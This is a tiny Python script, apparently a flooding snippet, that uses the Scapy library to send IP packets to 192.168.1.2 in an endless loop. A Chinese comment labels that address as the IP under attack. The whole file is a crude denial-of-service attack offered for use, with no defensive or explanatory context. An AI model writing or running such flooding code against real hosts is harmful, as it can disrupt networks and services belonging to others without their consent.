from scapy.all import *
pkt=IP(dst='192.168.1.2')    #192.168.1.2为被攻击IP    
while True:
	send(pkt)
